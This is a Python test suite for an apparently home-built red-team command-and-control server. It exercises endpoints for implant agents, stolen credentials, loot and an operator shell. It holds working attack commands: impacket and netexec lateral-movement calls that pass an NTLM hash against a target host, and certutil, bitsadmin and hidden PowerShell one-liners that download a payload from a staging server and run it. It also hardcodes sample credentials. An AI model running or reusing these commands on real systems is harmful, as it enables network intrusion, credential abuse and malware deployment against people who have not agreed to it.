#!/usr/bin/env python3
"""
C2 GUI API Test Suite
Tests all REST endpoints directly — no browser, no CDP.
Usage: python3 test_gui_api.py [--token TOKEN] [--base http://localhost:8888]
"""

import sys
import json
import time
import argparse
import urllib.request
import urllib.error
import urllib.parse
import threading
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── Config ────────────────────────────────────────────────────────────────────
BASE    = "http://localhost:8888"
TOKEN   = None   # auto-fetched if None
TIMEOUT = 15     # seconds per request (except /browse/ps which uses 65)

# Target for lateral movement tests
TARGET   = "10.2.20.100"
AGENT_ID = None  # auto-selected from first active agent

CREDS = [
    {"user": "Administrator", "pass": "",         "hash": "aad3b435b51404eeaad3b435b51404ee:88f4c71a40249536753b5732d1b0951a", "domain": ""},
    {"user": "localuser",     "pass": "password",  "hash": "",  "domain": ""},
    {"user": "jsmith",        "pass": "Summer2024!", "hash": "", "domain": "CORP"},
]

LOLBIN_METHODS = ["certutil", "bitsadmin", "ps_iex"]

# ── Helpers ───────────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

results = []

def log(symbol, label, detail="", color=RESET):
    line = f"{color}{symbol} {label}{RESET}"
    if detail:
        line += f"  {YELLOW}{detail}{RESET}"
    print(line)

def ok(label, detail=""):
    results.append(("PASS", label))
    log("✓", label, detail, GREEN)

def fail(label, detail=""):
    results.append(("FAIL", label))
    log("✗", label, detail, RED)

def skip(label, detail=""):
    results.append(("SKIP", label))
    log("~", label, detail, YELLOW)

def req(method, path, data=None, headers=None, timeout=TIMEOUT, raw_base=None):
    base = raw_base or BASE
    url = base + path
    h = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}
    if headers:
        h.update(headers)
    body = json.dumps(data).encode() if data else None
    rq = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(rq, timeout=timeout) as resp:
            ct = resp.headers.get("Content-Type", "")
            raw = resp.read()
            if "json" in ct:
                return resp.status, json.loads(raw)
            return resp.status, raw.decode(errors="replace")
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors="replace")
        try:
            return e.code, json.loads(raw)
        except Exception:
            return e.code, raw
    except Exception as e:
        return 0, str(e)

def get_token():
    rq = urllib.request.Request(f"{BASE}/", method="GET")
    with urllib.request.urlopen(rq, timeout=10) as r:
        html = r.read().decode()
    import re
    m = re.search(r"window\.__GUI_TOKEN__\s*=\s*['\"]([a-f0-9]+)['\"]", html)
    return m.group(1) if m else None

def nt_hash(h):
    """Extract NT part from LM:NT or return as-is."""
    return h.split(":")[-1] if ":" in h else h

def ipc_args(cred):
    """Build impacket and netexec auth strings."""
    u, p, h, d = cred["user"], cred["pass"], cred["hash"], cred["domain"]
    nt = nt_hash(h) if h else ""
    dom_pfx = f"{d}/" if d else ""
    dom_flag = f" -d {d}" if d else ""
    if h:
        nxe   = f"-u '{u}' -H '{nt}'{dom_flag}"
        impkt = f"{dom_pfx}{u}@{TARGET} -hashes :{nt}"
    else:
        nxe   = f"-u '{u}' -p '{p}'{dom_flag}"
        impkt = f"{dom_pfx}{u}:'{p}'@{TARGET}"
    return nxe, impkt

# ── Section 1: Auth & basic endpoints ────────────────────────────────────────
def test_auth():
    print(f"\n{BOLD}{CYAN}── Auth & Static ──────────────────────────────────────{RESET}")

    # Token check
    status, _ = req("GET", "/token")
    if status == 200:
        ok("/token  → 200")
    else:
        fail("/token", f"got {status}")

    # Wrong token
    old = TOKEN
    rq = urllib.request.Request(f"{BASE}/api/agents",
         headers={"Authorization": "Bearer deadbeef00000000000000000000000"})
    try:
        urllib.request.urlopen(rq, timeout=5)
        fail("Bad token should 401")
    except urllib.error.HTTPError as e:
        if e.code == 401:
            ok("Bad token → 401")
        else:
            fail("Bad token", f"got {e.code}")
    except Exception as e:
        fail("Bad token check", str(e))

# ── Section 2: Agent enumeration ─────────────────────────────────────────────
def test_agents():
    global AGENT_ID
    print(f"\n{BOLD}{CYAN}── Agents ─────────────────────────────────────────────{RESET}")

    status, body = req("GET", "/api/agents")
    if status != 200:
        fail("/api/agents", f"status {status}")
        return
    agents = body if isinstance(body, list) else body.get("agents", [])
    active = [a for a in agents if a.get("status") == "active"]
    ok(f"/api/agents → {len(agents)} agents, {len(active)} active")

    if not active:
        skip("Agent detail", "no active agents")
        return

    AGENT_ID = active[0]["id"]
    aid_short = AGENT_ID[:8]
    log(" ", f"Using agent {aid_short} ({active[0].get('hostname','?')} / {active[0].get('username','?')})", color=CYAN)

    # Agent detail
    status, body = req("GET", f"/api/agents/{AGENT_ID}")
    if status == 200:
        ok(f"/api/agents/{aid_short}  → 200")
    else:
        fail(f"/api/agents/{aid_short}", f"status {status}")

    # Results list
    status, body = req("GET", f"/api/agents/{AGENT_ID}/results?limit=5")
    if status == 200:
        count = len(body) if isinstance(body, list) else "?"
        ok(f"/api/agents/{aid_short}/results → {count} entries")
    else:
        fail(f"/api/agents/{aid_short}/results", f"status {status}")

# ── Section 3: Task submission ────────────────────────────────────────────────
def test_task(label, task_body, expected_keys=None):
    if not AGENT_ID:
        skip(label, "no agent")
        return None
    status, body = req("POST", f"/api/agents/{AGENT_ID}/task", data=task_body)
    if status in (200, 201, 202):
        tid = body.get("task_id") or body.get("id") or (body[0].get("id") if isinstance(body, list) else None)
        ok(label, f"task_id={tid}")
        return tid
    else:
        fail(label, f"status={status} body={str(body)[:120]}")
        return None

def test_tasks():
    print(f"\n{BOLD}{CYAN}── Task Submission ────────────────────────────────────{RESET}")
    if not AGENT_ID:
        skip("Task tests", "no agent available")
        return

    # whoami
    test_task("task: shell whoami",    {"type": "shell", "cmd": "whoami"})
    # pwd
    test_task("task: shell pwd",       {"type": "shell", "cmd": "pwd"})
    # ps (list processes via task)
    test_task("task: ps",              {"type": "ps"})
    # sleep change (back to 30s after test)
    test_task("task: sleep 10",        {"type": "sleep", "sleep": 10, "jitter": 5})
    time.sleep(2)
    test_task("task: sleep 30 (restore)", {"type": "sleep", "sleep": 30, "jitter": 20})

# ── Section 4: Process list via /browse/ps ────────────────────────────────────
def test_process_list():
    print(f"\n{BOLD}{CYAN}── Process List (/browse/ps) ──────────────────────────{RESET}")
    if not AGENT_ID:
        skip("/browse/ps", "no agent")
        return

    aid_short = AGENT_ID[:8]
    log(" ", f"Requesting process list for {aid_short} (timeout=60s)...", color=CYAN)
    t0 = time.time()
    status, body = req("GET", f"/browse/ps?agent={AGENT_ID}&timeout=60", timeout=70)
    elapsed = time.time() - t0

    if status == 200 and isinstance(body, dict) and "procs" in body:
        count = len(body["procs"])
        ok(f"/browse/ps → {count} processes", f"in {elapsed:.1f}s")
    else:
        fail("/browse/ps", f"status={status} elapsed={elapsed:.1f}s body={str(body)[:120]}")

# ── Section 5: File browser (/browse/ls) ──────────────────────────────────────
def test_file_browser():
    print(f"\n{BOLD}{CYAN}── File Browser (/browse/ls) ──────────────────────────{RESET}")
    if not AGENT_ID:
        skip("/browse/ls", "no agent")
        return

    log(" ", "Requesting C:\\ listing (timeout=60s)...", color=CYAN)
    t0 = time.time()
    status, body = req("GET", f"/browse/ls?agent={AGENT_ID}&path=C:\\&timeout=60", timeout=70)
    elapsed = time.time() - t0

    if status == 200:
        entries = body if isinstance(body, list) else body.get("entries", body.get("files", []))
        ok(f"/browse/ls C:\\ → {len(entries) if isinstance(entries,list) else '?'} entries", f"{elapsed:.1f}s")
    else:
        fail("/browse/ls", f"status={status} elapsed={elapsed:.1f}s body={str(body)[:120]}")

# ── Section 6: Creds store ────────────────────────────────────────────────────
def test_creds():
    print(f"\n{BOLD}{CYAN}── Credentials Store ──────────────────────────────────{RESET}")

    status, body = req("GET", "/api/creds")
    if status == 200:
        count = len(body) if isinstance(body, list) else "?"
        ok(f"/api/creds GET → {count} entries")
    else:
        fail("/api/creds GET", f"status {status}")

# ── Section 7: Loot ───────────────────────────────────────────────────────────
def test_loot():
    print(f"\n{BOLD}{CYAN}── Loot ───────────────────────────────────────────────{RESET}")

    status, body = req("GET", "/api/uploads")
    if status == 200:
        count = len(body) if isinstance(body, list) else "?"
        ok(f"/api/uploads → {count} entries")
    else:
        fail("/api/uploads", f"status {status}")

# ── Section 8: Listeners / Profiles ──────────────────────────────────────────
def test_listeners():
    print(f"\n{BOLD}{CYAN}── Listeners & Profiles ───────────────────────────────{RESET}")

    status, body = req("GET", "/api/profiles")
    if status == 200:
        count = len(body) if isinstance(body, list) else "?"
        ok(f"/api/profiles → {count} profiles")
    else:
        fail("/api/profiles", f"status {status}")

    status, body = req("GET", "/api/jobs")
    if status == 200:
        count = len(body) if isinstance(body, list) else "?"
        ok(f"/api/jobs → {count} listeners")
    else:
        fail("/api/jobs", f"status {status}")

# ── Section 9: /exec operator shell ──────────────────────────────────────────
def test_exec_shell():
    print(f"\n{BOLD}{CYAN}── Operator Shell (/exec) ─────────────────────────────{RESET}")

    cmds = [
        ("whoami",          "id check"),
        ("ls payloads/",    "payload listing"),
        ("ls payloads/*.exe 2>/dev/null | wc -l", "exe count"),
    ]
    for cmd, label in cmds:
        body_str = json.dumps({"cmd": cmd})
        rq = urllib.request.Request(
            f"{BASE}/exec",
            data=body_str.encode(),
            headers={"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"},
            method="POST"
        )
        try:
            with urllib.request.urlopen(rq, timeout=10) as r:
                out = r.read().decode(errors="replace")
            # SSE format: "data: <line>\n\n"
            lines = [l[6:] for l in out.splitlines() if l.startswith("data:")]
            ok(f"/exec {cmd}", " | ".join(lines[:3]))
        except Exception as e:
            fail(f"/exec {cmd}", str(e))

# ── Section 10: Internal Pentest — credential × method matrix ────────────────
def run_exec_cmd(cmd, label):
    """Run a command via /exec and return (ok, output)."""
    body_str = json.dumps({"cmd": cmd})
    rq = urllib.request.Request(
        f"{BASE}/exec",
        data=body_str.encode(),
        headers={"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(rq, timeout=90) as r:
            out = r.read().decode(errors="replace")
        lines = [l[6:] for l in out.splitlines() if l.startswith("data:")]
        joined = "\n".join(lines)
        failed_markers = ["ERROR", "error", "failed", "refused", "denied", "FAILURE",
                          "unpack", "STATUS_LOGON_FAILURE", "[-]"]
        is_fail = any(m in joined for m in failed_markers)
        return not is_fail, joined
    except Exception as e:
        return False, str(e)

def test_ipc_matrix():
    print(f"\n{BOLD}{CYAN}── Internal Pentest: Credential × Method Matrix ───────{RESET}")

    METHODS = {
        "wmiexec":  lambda nxe, impkt: f"impacket-wmiexec {impkt} -nooutput 'cmd /c echo OK'",
        "atexec":   lambda nxe, impkt: f"impacket-atexec  {impkt} 'cmd /c echo OK'",
        "smbexec":  lambda nxe, impkt: f"impacket-smbexec {impkt} -nooutput 'cmd /c echo OK'",
        "psexec":   lambda nxe, impkt: f"impacket-psexec  {impkt} -nooutput 'cmd /c echo OK && exit'",
        "netexec":  lambda nxe, impkt: f"netexec smb {TARGET} {nxe} -x 'echo OK'",
    }

    def test_one(cred, method, fn):
        nxe, impkt = ipc_args(cred)
        cmd = fn(nxe, impkt)
        label = f"{method:10} | {cred['user']:15}"
        t0 = time.time()
        success, out = run_exec_cmd(cmd, label)
        elapsed = time.time() - t0
        short_out = out.strip().splitlines()[-1][:80] if out.strip() else ""
        if success:
            ok(label, f"{elapsed:.1f}s  {short_out}")
        else:
            fail(label, f"{elapsed:.1f}s  {short_out}")

    with ThreadPoolExecutor(max_workers=4) as ex:
        futures = []
        for cred in CREDS:
            for method, fn in METHODS.items():
                futures.append(ex.submit(test_one, cred, method, fn))
        for f in as_completed(futures):
            f.result()  # exceptions surface here

# ── Section 11: LOLBin staging matrix ────────────────────────────────────────
def test_lolbin_matrix():
    print(f"\n{BOLD}{CYAN}── LOLBin Staging Matrix ──────────────────────────────{RESET}")

    # HTTP staging server check
    try:
        urllib.request.urlopen("http://10.2.20.200:8081/ekko.exe", timeout=3)
        staging_ok = True
    except Exception:
        staging_ok = False

    if not staging_ok:
        # Start staging server
        log(" ", "Starting HTTP staging server on 10.2.20.200:8081...", color=CYAN)
        subprocess.Popen(
            ["python3", "-m", "http.server", "8081", "--directory",
             "/home/kali/workspace/c2/c2/bin/payloads"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(2)

    LOLBINS = {
        "certutil": (
            "certutil -urlcache -split -f http://10.2.20.200:8081/ekko.exe "
            "C:\\Windows\\Temp\\svc2.exe && C:\\Windows\\Temp\\svc2.exe"
        ),
        "bitsadmin": (
            "bitsadmin /transfer j http://10.2.20.200:8081/ekko.exe "
            "C:\\Windows\\Temp\\svc3.exe && C:\\Windows\\Temp\\svc3.exe"
        ),
        "ps_iex": (
            "powershell -nop -w hidden -c "
            "\"$b=[System.IO.File]::ReadAllBytes('C:\\Windows\\Temp\\svc4.exe');"
            "[System.IO.File]::WriteAllBytes('C:\\Windows\\Temp\\svc4.exe',"
            "(New-Object Net.WebClient).DownloadData('http://10.2.20.200:8081/ekko.exe'));"
            "Start-Process C:\\Windows\\Temp\\svc4.exe\""
        ),
    }

    DELIVERY_METHODS = {
        "wmiexec": lambda win_cmd: (
            f"impacket-wmiexec Administrator@{TARGET} "
            f"-hashes :88f4c71a40249536753b5732d1b0951a "
            f"-nooutput 'cmd /c {win_cmd}'"
        ),
        "netexec": lambda win_cmd: (
            f"netexec smb {TARGET} -u Administrator "
            f"-H '88f4c71a40249536753b5732d1b0951a' -x '{win_cmd}'"
        ),
    }

    def test_lolbin(lolbin_name, win_cmd, delivery_name, build_cmd):
        full_cmd = build_cmd(win_cmd)
        label = f"{delivery_name:10} | {lolbin_name}"
        t0 = time.time()
        success, out = run_exec_cmd(full_cmd, label)
        elapsed = time.time() - t0
        short_out = out.strip().splitlines()[-1][:80] if out.strip() else ""
        if success:
            ok(label, f"{elapsed:.1f}s")
        else:
            fail(label, f"{elapsed:.1f}s  {short_out}")

    with ThreadPoolExecutor(max_workers=3) as ex:
        futures = []
        for lb_name, win_cmd in LOLBINS.items():
            for d_name, build_fn in DELIVERY_METHODS.items():
                futures.append(ex.submit(test_lolbin, lb_name, win_cmd, d_name, build_fn))
        for f in as_completed(futures):
            f.result()

# ── Section 12: BOF list ─────────────────────────────────────────────────────
def test_bofs():
    print(f"\n{BOLD}{CYAN}── BOFs ────────────────────────────────────────────────{RESET}")
    status, body = req("GET", "/bofs")
    if status == 200:
        count = len(body) if isinstance(body, list) else "?"
        ok(f"/bofs → {count} BOFs available")
    else:
        fail("/bofs", f"status {status}")

# ── Summary ───────────────────────────────────────────────────────────────────
def summary():
    print(f"\n{BOLD}{'─'*55}{RESET}")
    passed = sum(1 for r in results if r[0] == "PASS")
    failed = sum(1 for r in results if r[0] == "FAIL")
    skipped = sum(1 for r in results if r[0] == "SKIP")
    total = len(results)
    color = GREEN if failed == 0 else RED
    print(f"{color}{BOLD}  {passed}/{total} passed  |  {failed} failed  |  {skipped} skipped{RESET}")
    if failed:
        print(f"\n{RED}Failed:{RESET}")
        for r in results:
            if r[0] == "FAIL":
                print(f"  ✗ {r[1]}")
    print()

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    global TOKEN, BASE, TIMEOUT

    parser = argparse.ArgumentParser(description="C2 GUI API test suite")
    parser.add_argument("--token", help="GUI bearer token (auto-fetched if omitted)")
    parser.add_argument("--base",  default="http://localhost:8888", help="GUI base URL")
    parser.add_argument("--timeout", type=int, default=15)
    parser.add_argument("--skip-ipc",    action="store_true", help="Skip credential×method matrix")
    parser.add_argument("--skip-lolbin", action="store_true", help="Skip LOLBin staging matrix")
    parser.add_argument("--skip-ps",     action="store_true", help="Skip process list (slow)")
    parser.add_argument("--skip-ls",     action="store_true", help="Skip file browser (slow)")
    args = parser.parse_args()

    BASE    = args.base
    TIMEOUT = args.timeout

    print(f"{BOLD}{CYAN}REDTEAM C2 — GUI API Test Suite{RESET}")
    print(f"  Base : {BASE}")

    # Fetch token
    if args.token:
        TOKEN = args.token
    else:
        print("  Token: auto-fetching...", end=" ")
        try:
            TOKEN = get_token()
            print(f"{GREEN}ok{RESET}")
        except Exception as e:
            print(f"{RED}FAILED: {e}{RESET}")
            sys.exit(1)

    print(f"  Token: {TOKEN[:8]}...{TOKEN[-4:]}")

    # Run sections
    test_auth()
    test_agents()
    test_exec_shell()
    test_bofs()
    test_listeners()
    test_creds()
    test_loot()
    test_tasks()

    if not args.skip_ps:
        test_process_list()
    else:
        skip("/browse/ps", "--skip-ps")

    if not args.skip_ls:
        test_file_browser()
    else:
        skip("/browse/ls", "--skip-ls")

    if not args.skip_ipc:
        test_ipc_matrix()
    else:
        skip("IPC matrix", "--skip-ipc")

    if not args.skip_lolbin:
        test_lolbin_matrix()
    else:
        skip("LOLBin matrix", "--skip-lolbin")

    summary()

if __name__ == "__main__":
    main()
